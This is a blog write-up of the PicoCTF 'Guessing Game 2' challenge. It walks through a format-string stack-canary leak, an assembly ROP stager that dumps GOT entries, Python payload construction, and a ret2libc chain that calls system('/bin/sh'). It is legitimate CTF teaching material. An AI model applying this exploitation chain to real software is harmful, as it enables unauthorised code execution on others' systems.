---
layout: post
title: "PicoCTF: Guessing Game 2 - Writeup"
date:   2022-03-12 15:46:00 +0000
categories: ctf binary-exploitation
---

# Introduction

This challenge is pretty straightforward and provides a great introduction to the ret2libc method of exploitation.

# Gaining an understanding of the program

The program begins by asking the user to guess a *random* number based on the remainder of the address of `rand` as seen in the code snippet below. When guessed correctly, the program asks for a name and proceeds by printing it to the screen.

```c
#define BUFSIZE 512

long get_random() {
    return rand;
}

int do_stuff() {
    long ans = (get_random() % 4096) + 1;	
    printf("What number would you like to guess?\n");
    char guess[BUFSIZE];
    fgets(guess, BUFSIZE, stdin);
    ...
}

void win() {
    char winner[BUFSIZE];
    printf("New winner!\nName? ");
    gets(winner);
    printf("Congrats: ");
    printf(winner);
    printf("\n\n");
}
```

#### Bug hunting

The program contains two critical vulnerabilities, a buffer overflow abetted by `gets` and a format string vulnerability. Either one of these vulnerabilities could result in code execution, however, running `checksec` on the binary yielded security mitigations employed. 

```bash
➜  Guessing Game 2 checksec vuln
[*] 'Guessing Game 2/vuln'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

As you can see, the binary is hardened with [RELRO](https://www.redhat.com/en/blog/hardening-elf-binaries-using-relocation-read-only-relro) preventing us from leveraging the format string vulnerability to overwrite the Global Offset Table ([GOT](https://en.wikipedia.org/wiki/Global_Offset_Table)). [DEP](https://en.wikipedia.org/wiki/Executable_space_protection), meaning that we cannot use the buffer overflow vulnerability to jump to the stack. Even if the stack was executable we would still be unable to achieve code execution due to the presence of a [stack canary](https://en.wikipedia.org/wiki/Buffer_overflow_protection#Random_canaries). 

To successfully exploit this binary, we need to leverage the format string vulnerability to leak the stack cookie and use it in the buffer-overflow vulnerability to allow code execution via a ROP chain. First things first, we need to *guess* the *random* number.

# Bruteforcing the random number {#brute-forcing}

`(get_random() % 4096) + 1` gives the solutions a range from -4095 to +4097 a total of 8192 solutions however we can narrow this down. Firstly, as the function address is coerced to a signed 32-bit integer we know that this integer will be negative as libc is usually based at a high address. Secondly, the addresses of the libc functions always seem to be 16 byte aligned meaning that they go up in increments of 16, massively reducing the range to 256 possible values.

```python
solutions = range(1, -4095, -16)
```

# Leaking the stack canary {#leaking-stack-canary}

Using gdb([gef](https://gef.readthedocs.io/en/master/)) I broke at main, running the gef canary command to find the current stack canary. I used python to generate a format string based on `"%x " * (512 // 3)` and sent it to the program. Counting the distance from the beginning of the stack to the canary gave me an offset of 135. Using offset 135, we can use the format string `"%135$x"` to reliably leak the stack canary.

```bash
gef➤  canary
[+] The canary of process 78855 is at 0xffffd30b, value is 0x88397800
```

```bash
Congrats: 200 f7fa2600 804877d 1 fffffad1 fffffad1 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 f7dd0078 f2f70100 80489fc 8049fbc ffffd098 804888c 0 0 3e8 1 ffffd0b0 f7fa2000 0 f7d9b4ca ffffd31b ffffd174 f7fa2000 f7d9b4ca 1 ffffd174 ffffd17c ffffd0d0 f7fa2000 80487ff 1 ffffd174 f7fa2000 0 ffffd17c 0 eb338acc a7fbe6dc 0 0 0 ffffd17c 0
```

# Leaking libc through a ROP chain

Armed with the ability to leak the stack canary, we can now focus on getting our shell. I tried to avoid having to leak libc instead, making a syscall to `execve` with a ROP chain but there were not enough useful gadgets. Though using `ROPgadget`, I found some helpful gadgets which allowed me to make a ROP chain to dump GOT functions and write to data, I’ll be calling this the stager for brevity.

```as
# Addresses obtained using IDA

.equ DATA_OFFSET, 0x804A000
.equ GOT_IO_GETS_OFFSET, 0x8049FCC
.equ GOT_IO_PRINTF_OFFSET, 0x8049FC8
.equ GOT_IO_FGETS_OFFSET, 0x8049FD0
.equ GOT_GETEGID_OFFSET, 0x8049FD8

.macro print fmt, addr
    .long 0x08048470    # _printf@plt
    .long 0x0804844e    # add esp, 8 ; pop ebx ; ret
    .long \fmt
    .long \addr
    .long 0x0           # padding
.endm

.macro gets buffer
    .long 0x8048480     # gets@plt
    .long 0x804844e     # add esp, 8; pop ebx; ret
    .long \buffer
    .quad 0x0           # padding
.endm

.global _start

_start:
    gets DATA_OFFSET
    print DATA_OFFSET, GOT_IO_GETS_OFFSET
    print DATA_OFFSET, GOT_IO_PRINTF_OFFSET
    print DATA_OFFSET, GOT_IO_FGETS_OFFSET
    print DATA_OFFSET, GOT_GETEGID_OFFSET
    gets DATA_OFFSET
    .long 0x80487FF     # main (restart app)
```

The stager works by waiting for input from stdin and writing it to a writable section in the binary. We are able to use a hardcoded address as the binary is not a PIE. After input is received the stager uses the data written as the format string argument to `printf` and proceeds to use this format string to dump GOT entries. The stager waits for one last input to write to the writable section and then restarts the app by returning to `main`.

#### Getting the stager running

We now need to overwrite the return address to an address we control. Using gef's `pattern create` command to create a string and pass it to the application we'll be able to obtain the offset to the return address. Using the information gained I was able to make this python function.

```python
def create_rop_chain(stack_cookie: int, stager: BinaryIO) -> bytes:
    exploit =  b'A' * 512           # Padding
    exploit += p32(stack_cookie)    # Stack cookie
    exploit += b'A' * 12            # Offset to EIP
    exploit += stager.read()        # EIP
    return exploit
```

#### Finding the libc version on the server

Now that we are able to run our stager we'll pass it `%.4s` as the first argument for the format string and then recieve the GOT entry for `gets`. The stager will send us a 4 byte string containing the address which can be converted to something useable using `int.from_bytes` in python. Now that we have the addresses we can use a [libc database](https://libc.blukat.me/) to find the libc version running on the server so that we can get the offsets of functions in that libc binary. Using this I found the libc version to be `libc6-i386_2.27-3ubuntu1.4_amd64.so`. Thankfully, the libc database search provides us with offsets to useful functions. For the final input to the stager we can send it `/bin/sh` to write to the data section for us to pass it to `system` and get a shell.

![libc database search](/assets/images/libc_database_search.png)

# Popping a shell

Subtracting the GOT entry to `gets` from the offset of `gets` in the libc binary we can find the base address for libc. Using this we can contruct the final ROP chain and call `system` with the binary path being a pointer to the data section with the `/bin/sh` string we just wrote using the stager.

```python
exploit =  p32(libc + LIBC_SYSTEM_OFFSET)   # system
exploit += p32(libc + LIBC_EXIT_OFFSET)     # exit when routine complete
exploit += p32(DATA_OFFSET)                 # /bin/sh
```

# The exploit

Here is the complete [source code](https://gist.github.com/aidnzz/5631bc65c38318fe74dd23e0390c9633). Using [pwntools](https://docs.pwntools.com/en/stable/) really simplifies exploit development and features some really good logging utilities.

<script id="asciicast-dKo2JK5qNYfD9ln8n8zp4gKvy" src="https://asciinema.org/a/dKo2JK5qNYfD9ln8n8zp4gKvy.js" async data-size="small"></script>
